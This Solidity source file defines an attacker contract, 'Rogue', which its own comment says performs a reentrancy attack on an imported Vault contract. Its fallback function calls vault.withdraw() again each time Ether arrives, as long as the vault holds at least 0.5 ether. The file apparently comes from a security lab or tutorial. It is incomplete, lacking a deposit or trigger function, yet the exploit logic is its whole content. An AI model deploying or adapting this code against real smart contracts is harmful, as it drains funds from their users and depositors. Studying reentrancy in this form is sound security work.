// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

import './vault.sol';

/// @notice The contract to perform the reentrancy attack
contract Rogue {
    Vault public vault;
    constructor(address _vaultAddress){
        vault = Vault(_vaultAddress);
    }

    /// @notice Fallback is called when Vault sends Ether to this contract.
    fallback() external payable{
        if(address(vault).balance >= 0.5 ether) {
            vault.withdraw();
        }
    }

    

}